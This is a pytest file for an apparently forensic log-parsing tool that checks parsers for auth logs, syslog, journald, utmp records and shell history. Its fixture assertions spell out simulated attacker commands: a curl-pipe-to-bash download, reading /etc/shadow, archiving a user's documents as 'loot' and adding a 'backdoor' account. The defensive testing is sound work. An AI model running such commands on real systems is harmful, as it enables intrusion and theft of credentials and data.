"""Tests for the individual parsers against fixture files."""

from __future__ import annotations

import gzip
from datetime import UTC, datetime
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest

from sherlog.parsers.base import ParseContext, ParsedEvent, UnsupportedArtifact, user_from_path
from sherlog.parsers.journald import JournaldBinaryParser, JournaldJsonParser
from sherlog.parsers.shell_history import BashHistoryParser, ZshHistoryParser
from sherlog.parsers.syslog import LinuxAuthParser, SyslogParser, infer_start_year
from sherlog.parsers.utmp import (
    BOOT_TIME,
    DEAD_PROCESS,
    LOGIN_PROCESS,
    RUN_LVL,
    USER_PROCESS,
    BtmpParser,
    LastlogParser,
    WtmpParser,
)
from tests.helpers import FIXTURES, copy_fixture, lastlog_file, utmp_record

UTC_TZ = ZoneInfo("UTC")


def _parse(parser, path: Path, tz: str = "UTC", mtime: datetime | None = None) -> list[ParsedEvent]:  # type: ignore[no-untyped-def]
    ctx = ParseContext(path=path, case_tz=ZoneInfo(tz), mtime=mtime)
    return list(parser.parse(path, ctx))


# --- syslog / auth ----------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("months", "ref", "expected"),
    [
        ([1, 2, 3], datetime(2025, 3, 10), 2025),
        ([12, 12, 1], datetime(2025, 1, 5), 2024),  # rollover inside file
        ([11, 12], datetime(2025, 1, 5), 2024),  # file ends in Dec, mtime in Jan
        ([12, 1, 6, 1], datetime(2026, 2, 1), 2024),  # two rollovers
    ],
)
def test_infer_start_year(months: list[int], ref: datetime, expected: int) -> None:
    assert infer_start_year(months, ref) == expected


def test_auth_log_year_rollover_and_fields(tmp_path: Path) -> None:
    path = copy_fixture("auth.log", tmp_path / "a", mtime=datetime(2025, 1, 5, tzinfo=UTC))
    events = _parse(LinuxAuthParser(), path, mtime=datetime(2025, 1, 5, tzinfo=UTC))

    first, last = events[0], events[-1]
    assert first.timestamp_utc == datetime(2024, 12, 31, 23, 58, 1, tzinfo=UTC)
    assert last.timestamp_utc == datetime(2025, 1, 1, 0, 11, tzinfo=UTC)
    assert first.timezone_assumed and "year_inferred" in first.tags
    assert first.host == "web01"

    by_type: dict[str, list[ParsedEvent]] = {}
    for e in events:
        by_type.setdefault(e.event_type, []).append(e)
    assert len(by_type["auth.login.failure"]) == 2
    assert [e.actor for e in by_type["auth.login.success"]] == ["deploy", "backdoor"]
    [create] = by_type["user.create"]
    assert create.target == "backdoor" and "uid:1002" in create.tags
    sudo = by_type["auth.sudo"]
    assert sudo[0].command == "/usr/sbin/useradd -m -s /bin/bash backdoor"
    assert "sudo_failed" in sudo[1].tags
    assert by_type["auth.su"][0].actor == "deploy"
    assert by_type["password.change"][0].target == "backdoor"
    [err] = by_type["parse_error"]
    assert err.raw == "this line is not syslog at all" and err.line_number == 20


def test_case_timezone_applied(tmp_path: Path) -> None:
    path = copy_fixture("auth.log", tmp_path / "a")
    events = _parse(
        LinuxAuthParser(), path, tz="Africa/Addis_Ababa", mtime=datetime(2025, 1, 5, tzinfo=UTC)
    )
    # 23:58:01 local (UTC+3) -> 20:58:01 UTC
    assert events[0].timestamp_utc == datetime(2024, 12, 31, 20, 58, 1, tzinfo=UTC)


def test_iso_timestamps(tmp_path: Path) -> None:
    events = _parse(LinuxAuthParser(), FIXTURES / "secure-iso.log", tz="Africa/Addis_Ababa")
    assert events[0].timestamp_utc == datetime(2024, 5, 1, 7, 0, 0, 123456, tzinfo=UTC)
    assert events[0].timezone_assumed is False
    assert "year_inferred" not in events[0].tags
    # No offset -> case timezone assumed.
    assert events[3].timezone_assumed is True
    assert events[3].timestamp_utc == datetime(2024, 5, 1, 7, 2, tzinfo=UTC)
    assert events[2].event_type == "auth.sudo" and events[2].actor == "alice"


def test_syslog_events(tmp_path: Path) -> None:
    events = _parse(SyslogParser(), FIXTURES / "syslog", mtime=datetime(2025, 3, 3, tzinfo=UTC))
    types = [e.event_type for e in events]
    assert types == [
        "system.boot",
        "kernel.message",
        "service.start",
        "service.start",
        "cron.exec",
        "cron.modify",
        "service.stop",
        "service.stop",
        "other",
        "other",
    ]
    assert events[4].command == "/tmp/.x/update.sh >/dev/null 2>&1"
    assert events[5].actor == "www-data"
    assert events[2].target == "rsyslogd"
    assert "service_failed" in events[9].tags


def test_syslog_gzip_transparent(tmp_path: Path) -> None:
    gz = tmp_path / "syslog.2.gz"
    gz.write_bytes(gzip.compress((FIXTURES / "syslog").read_bytes()))
    events = _parse(SyslogParser(), gz, mtime=datetime(2025, 3, 3, tzinfo=UTC))
    assert len(events) == 10


def test_feb29_in_non_leap_year_does_not_crash(tmp_path: Path) -> None:
    f = tmp_path / "s"
    f.write_text("Feb 29 10:00:00 h sshd[1]: Server listening on 0.0.0.0 port 22.\n")
    [ev] = _parse(SyslogParser(), f, mtime=datetime(2025, 3, 1, tzinfo=UTC))
    assert ev.timestamp_utc is None and "timestamp_invalid" in ev.tags


# --- journald ---------------------------------------------------------------------------------


def test_journald_json() -> None:
    events = _parse(JournaldJsonParser(), FIXTURES / "journal.json")
    assert [e.event_type for e in events] == [
        "auth.login.failure",
        "auth.login.success",
        "system.boot",
        "other",
        "service.start",
        "parse_error",
    ]
    assert events[0].timestamp_utc == datetime(2024, 5, 1, 10, 0, tzinfo=UTC)
    assert events[0].timezone_assumed is False
    assert events[0].host == "app01" and events[0].src_ip == "192.0.2.99"
    assert "unit:ssh.service" in events[0].tags


def test_journald_binary_unsupported_without_bindings(tmp_path: Path) -> None:
    f = tmp_path / "system.journal"
    f.write_bytes(b"LPKSHHRH" + b"\0" * 256)
    with pytest.raises(UnsupportedArtifact, match="journalctl"):
        _parse(JournaldBinaryParser(), f)


# --- utmp / lastlog ---------------------------------------------------------------------------


def test_wtmp(tmp_path: Path) -> None:
    f = tmp_path / "wtmp"
    f.write_bytes(
        utmp_record(BOOT_TIME, user="reboot", line="~", host="6.1.0", ts=1714550000)
        + utmp_record(USER_PROCESS, user="alice", line="pts/0", host="192.0.2.5", ip="192.0.2.5")
        + utmp_record(USER_PROCESS, user="bob", line="pts/1", ip="2001:db8::5", ts=1714557700)
        + utmp_record(DEAD_PROCESS, line="pts/0", ts=1714558000)
        + utmp_record(RUN_LVL, user="shutdown", line="~", ts=1714559000)
    )
    events = _parse(WtmpParser(), f)
    assert [e.event_type for e in events] == [
        "system.boot",
        "auth.login.success",
        "auth.login.success",
        "auth.logout",
        "system.shutdown",
    ]
    assert events[1].actor == "alice" and events[1].src_ip == "192.0.2.5"
    assert events[1].target == "pts/0"
    assert events[2].src_ip == "2001:db8::5"
    assert events[1].timestamp_utc == datetime(2024, 5, 1, 10, 0, tzinfo=UTC)


def test_btmp_and_truncation(tmp_path: Path) -> None:
    f = tmp_path / "btmp"
    f.write_bytes(
        utmp_record(
            LOGIN_PROCESS, user="root", line="ssh:notty", host="203.0.113.9", ip="203.0.113.9"
        )
        + b"\x06\x00partial"
    )
    events = _parse(BtmpParser(), f)
    assert events[0].event_type == "auth.login.failure" and events[0].actor == "root"
    assert events[1].event_type == "parse_error"


def test_lastlog(tmp_path: Path) -> None:
    f = lastlog_file(tmp_path / "lastlog", {0: (1714557600, "pts/0", "192.0.2.1"), 3: (0, "", "")})
    [ev] = _parse(LastlogParser(), f)
    assert ev.actor == "uid:0" and ev.src_ip == "192.0.2.1"


# --- shell history ----------------------------------------------------------------------------


def test_bash_history_plain(tmp_path: Path) -> None:
    path = copy_fixture("bash_history", tmp_path / "home" / "alice" / ".bash_history")
    events = _parse(BashHistoryParser(), path)
    assert len(events) == 6
    assert all(e.timestamp_utc is None and e.actor == "alice" for e in events)
    assert events[2].command.startswith("wget ")  # type: ignore[union-attr]


def test_bash_history_timestamps() -> None:
    events = _parse(BashHistoryParser(), FIXTURES / "bash_history_ts")
    assert [e.command for e in events] == [
        "id",
        "curl -s http://198.51.100.20/p | bash",
        "sudo cat /etc/shadow",
    ]
    assert events[1].timestamp_utc == datetime(2024, 5, 1, 10, 0, 5, tzinfo=UTC)
    assert events[1].timestamp_raw == "#1714557605"


def test_zsh_history(tmp_path: Path) -> None:
    path = copy_fixture("zsh_history", tmp_path / "root" / ".zsh_history")
    events = _parse(ZshHistoryParser(), path)
    assert [e.actor for e in events] == ["root"] * 3
    assert events[1].command == "tar czf /tmp/loot.tgz /home/alice/Documents"
    assert "duration:2" in events[1].tags


@pytest.mark.parametrize(
    ("path", "user"),
    [
        ("/mnt/img/home/bob/.bash_history", "bob"),
        ("/mnt/img/root/.bash_history", "root"),
        ("/evidence/collected/bash_history", None),
    ],
)
def test_user_from_path(path: str, user: str | None) -> None:
    assert user_from_path(Path(path)) == user
